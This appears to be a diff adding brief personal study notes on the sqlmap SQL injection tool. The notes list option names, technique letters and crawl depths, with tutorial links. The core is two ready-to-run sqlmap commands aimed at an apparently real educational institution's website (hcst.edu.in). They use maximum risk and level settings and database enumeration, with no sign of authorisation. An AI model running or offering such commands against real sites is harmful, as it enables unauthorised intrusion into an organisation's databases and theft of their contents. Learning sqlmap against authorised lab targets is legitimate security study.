@@ -1,0 +1,38 @@
+Overview
+========
+
+technique 
+crawl 
+enumeration 
+batch 
+risk 
+level
+tread 
+verbosity 
+proxy 
+sql inzection via burp 
+
+
+Technique Types 
+B Boolean-based blind
+E Error-based
+U Union query-based
+S Stacked queries
+T Time-based blind
+Q Inline queries
+
+
+
+crawl
+depth 1 ---> https://www.example.com/x
+depth 2 ---> https://www.example.com/x/y
+depth 3 ---> https://www.example.com/x/y/z
+ 
+ sqlmap -u https://hcst.edu.in/ --crawl 2 --batch --threads=10 --risk=3 --level=5 --technique="U" --dbs --batch 
+ sqlmap -u https://hcst.edu.in/ --crawl 2 --batch --threads=10 --technique="U"
+
+
+
+ https://www.youtube.com/watch?v=zrc3nlw5di0 ---> mota bhai 
+ https://www.youtube.com/watch?v=QsMkQMKsIII ---> sqlmap tutorial 
+https://portswigger.net/web-security/sql-injection/cheat-sheet ---> sql injection cheat sheet
